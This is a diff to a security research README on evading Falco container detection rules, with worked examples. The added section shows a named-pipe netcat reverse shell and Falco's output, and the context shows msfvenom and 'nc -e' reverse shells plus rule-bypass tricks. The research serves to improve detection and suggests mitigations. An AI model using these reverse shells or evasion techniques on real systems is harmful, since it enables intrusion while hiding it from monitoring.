@@ -8,7 +8,6 @@ Binaries are docker and kubectl standalone binaries typically used to facilitate
 
 A separate **folder `CVE-2021-3156`** contains everything needed to build the docker image used to test CVE-2021-3156 vulnerability in section [A special case of "Sudo Potential Privilege Escalation"](#escalation): Dockerfile, exploit POC and a vulnerable sudo package.
 
-
 ## Falco Overview
 Higher abstration levels in Software and DevOps world have multiple advantages: they make software and configuration reuse easier; they facilitate code development and project creation. The price is the visibility. The higher the abstraction level the more difficult it is to monitor, inspect and debug it. Falco was born to solve this problem. As an ultimate "Wireshark" of Kubernetes, it can tell what process was spawned when and correlate this process to the workload on Kubernetes level. Falco's uniqueness is in the way it cuts through the abstraction levels and brings together multiple debug and monitor sources into the parsable and manageable environment.
 
@@ -25,7 +24,7 @@ Every Falco rule must have an associated priority. According to Falco [documenta
 
 ## Previous Work on Falco Bypasses
 This is not the first work on Falco bypasses. There were several projects before that focused on different bypass vectors:
-- Sep 2019 - by [NCC Group](https://www.antitree.com/2019/09/container-runtime-security-bypasses-on-falco/) - focused on image name maniulations to leverage Falco rules allow-lists.
+- Sep 2019 - by [NCC Group](https://www.antitree.com/2019/09/container-runtime-security-bypasses-on-falco/) - focused on image name manipulations to leverage Falco rules allow-lists.
 - August 2020 - by [Brad Geesaman](https://darkbit.io/blog/falco-rule-bypass) - similar to previous work, exploited weak image name comparison logic to leverage Falco rules allow-lists.
 - Nov 2020 - by [Leonardo Di Donato](https://www.youtube.com/watch?v=nGqWskXRSmo) - exploited twin syscalls that Falco missed, suggested other ideas used in this report.
 - June 2019 and ongoing - by [maintainers](https://github.com/falcosecurity/falco/issues/676) - ongoing issue handling the missing sister calls
@@ -68,7 +67,7 @@ root:*:18291:0:99999:7:::
 [Falco]
 SILENCE
 ```
-The success of this bypass is conditioned on the ability to create a symlink to the non-monitored subdirectory within the sensitive directory. The described symlink bypass techniques can be a lego pieces in bypassing other rules.
+The success of this bypass is conditioned on the ability to create a symlink to the non-monitored subdirectory within the sensitive directory. The described symlink bypass techniques can be lego pieces in bypassing other rules.
 
 Similarly, we can bypass **Write below etc**, **Write below root** and other write detection rules that rely on directory path comparison:
 ```
@@ -236,7 +235,47 @@ root@3a03766368a0:/#
 ```
 Still, we still have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triade. The first thought is swapping dup call with one of the syster calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.
 
-Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. For this we use msfvenom tool which is a de-facto standard payload generator in offensive security community:
+Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. What about payloads that redirect shell to netcat through pipe creation? For the first time we will use sshayb/fuber:latest - an ubuntu-based [image](Dockerfile) that was specifically built to contain necessary tools and utilities for this study[^2]:
+```
+[Container]
+docker run --rm -it sshayb/fuber:latest
+root@eabe8cffc8c8:/tmp# mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | /bin/nc 172.17.0.1 443 1>/tmp/backpipe
+-----
+[Host]
+sudo nc -nlvp 443
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:43588.
+hostname
+eabe8cffc8c8
+-----
+[Falco]
+12:47:37.884716967: Notice Network tool launched in container (user=root user_loginuid=-1 command=nc 172.17.0.1 443 parent_process=gbash container_id=eabe8cffc8c8 container_name=vigorous_hawking image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8 k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8
+```
+Great. This does not trigger "Redirect stdout/stdin" rule, and besides, getting rid of the "Network tool launched" is easy with the previous bypass techniques.																																																																																																	 
+   
+		   
+									   
+																											   
+	 
+	  
+				 
+											
+						 
+							  
+								 
+									   
+		
+			
+	 
+	   
+																																																																																												 
+   
+																																							   
+
+Finally, to be even more original and avoid triggering any rules without using previous bypasses, we can use the msfvenom tool, which is a de-facto standard payload generator in offensive security community:
 ```
 [Kali]
 kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f elf | base64
@@ -272,11 +311,11 @@ SILENCE
 ``` 
 <ins>Rules bypassed:</ins> **Redirect STDOUT/STDIN to Network Connection in Container**.
 
-<ins>Suggested mitigations:</ins> Include dup2 and dup3 sister calls; create separate rule to detect msfvenom-generated payloads.
+<ins>Suggested mitigations:</ins> Include dup2 and dup3 sister calls; create separate rule to detect msfvenom-generated payloads; create separate rule to detect mkfifo and mknod coupled with the usage of netcat.
 
 ### Bypass rules based on command arguments manipulation
 
-Another standard way to initiate a reverse shell is through the usage of netcat utility. For the first time we will use sshayb/fuber:latest - a ubuntu-based [image](Dockerfile) that was specifically built to contain necessary tools and utilities for this study[^2]:
+Another standard way to initiate a reverse shell is through the usage of the netcat utility with executable parameters:
 ```
 [Container]
 $ docker run -it sshayb/fuber:latest bash
@@ -321,7 +360,7 @@ hostname
 19:52:03.184973672: Notice Network tool launched in container (user=root user_loginuid=-1 command=nc 172.17.0.1 443 -ve /bin/bash parent_process=bash container_id=7917d5e18fd8 container_name=sleepy_mcclintock image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
 19:52:03.235157399: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8 process=nc parent=bash cmdline=nc 172.17.0.1 443 -ve /bin/bash terminal=34816 container_id=7917d5e18fd8 image=sshayb/fuber fd.name=172.17.0.2:50084->172.17.0.1:443 fd.num=0 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=7917d5e18fd8
 ```
-Even though Falco emits two events, the first rule is different now, which means we successfully bypassed **Netcat Remote Code Execution in Container**. Rule **Launch Suspicious Network Tool in Container** is of NOTICE priority (detection downgrade), relies on _proc.name_ comparison in `network_tool_binaries` list, and is therefore bypassable through traditional means. Among other things, this exercise points on Falco's correct logic to report the higher-priority event if multiple rules trigger as a result of the same call. But in the context of this discussion the more important point is having another evasion technique on hands through collation of the command line arguments.
+Even though Falco emits two events, the first rule is different now, which means we successfully bypassed **Netcat Remote Code Execution in Container**. Rule **Launch Suspicious Network Tool in Container** is of NOTICE priority (detection downgrade), relies on _proc.name_ comparison in `network_tool_binaries` list, and is therefore bypassable through traditional means. Among other things, this exercise points on Falco's correct logic to report the higher-priority event if multiple rules trigger as a result of the same call. But in the context of this discussion, the more important point is having another evasion technique on hand through collation of the command line arguments.
 
 To understand how common the usage of command line parameters in the default ruleset is and whether we can use this technique to evade other rules we search for _proc.args_ constructs. There are four other rules that use _proc.args_ command in a meaningful way:
 1. **Search Private Keys or Passwords**
@@ -395,7 +434,7 @@ Finally, rule **Mount Launched in Privileged Container** uses a unique construct
 
 ### Bypass sensitive mounts
 
-Mounting host directories into the container reduces the isolation level of the cotnainer. This is especially true for the sensitive directories, such as docker socket or /etc. Rule **Launch Sensitive Mount Container** detects such scenario, however, not all of the mounting scenarios are considered in `sensitive_mount` macro:
+Mounting host directories into the container reduces the isolation level of the container. This is especially true for the sensitive directories, such as docker socket or /etc. Rule **Launch Sensitive Mount Container** detects such scenario, however, not all of the mounting scenarios are considered in `sensitive_mount` macro:
 ```
 - macro: sensitive_mount
   condition: (container.mount.dest[/proc*] != "N/A" or
@@ -617,7 +656,7 @@ Some general recommendations and suggestions:
 ---
 
 [^1]: https://man7.org/linux/man-pages/man2/dup2.2.html
-[^2]: https://hub.docker.com/r/sshayb/fuber
+[^2]: https://hub.docker.com/repository/docker/sshayb/fuber
 [^3]: https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
 [^4]: https://sysdig.com/blog/cve-2021-3156-sudo-falco/
 [^5]: https://falco.org/docs/rules/supported-fields/
